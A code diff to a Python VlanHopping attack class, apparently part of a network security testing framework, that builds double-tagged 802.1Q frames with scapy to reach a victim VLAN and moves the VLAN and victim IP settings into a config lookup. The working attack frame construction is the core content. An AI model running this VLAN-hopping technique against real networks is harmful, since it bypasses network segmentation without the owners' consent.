@@ -15,9 +15,9 @@ class VlanHopping(Attack):
             scapy.conf.ifaces.reload()
             scapy.conf.route.resync()
             packet = (scapy.Ether(src=self.ethersrc, dst=self.etherdst)
-                     / scapy.Dot1Q(vlan=self.native_vlan)
-                     / scapy.Dot1Q(vlan=self.victim_vlan)
-                     / scapy.IP(dst=self.victim_ip)
+                     / scapy.Dot1Q(vlan=self.config.get('native_vlan'))
+                     / scapy.Dot1Q(vlan=self.config.get('victim_vlan'))
+                     / scapy.IP(dst=self.config.get('victim_ip'))
                      / scapy.ICMP())
             packet_list = []
             for i in range(10):
@@ -42,15 +42,3 @@ class VlanHopping(Attack):
         self.setup()
         self.attack()
         return self.result()
-
-    def __init__(self,
-                 interfaces: list[scapy.NetworkInterface],
-                 ip4network: ipaddress.IPv4Network,
-                 victim_ip = '192.168.3.4',
-                 native_vlan: int = 1 ,
-                 victim_vlan: int = 2,
-                 ):
-        super().__init__(interfaces, ip4network)
-        self.native_vlan = native_vlan
-        self.victim_vlan = victim_vlan
-        self.victim_ip = victim_ip
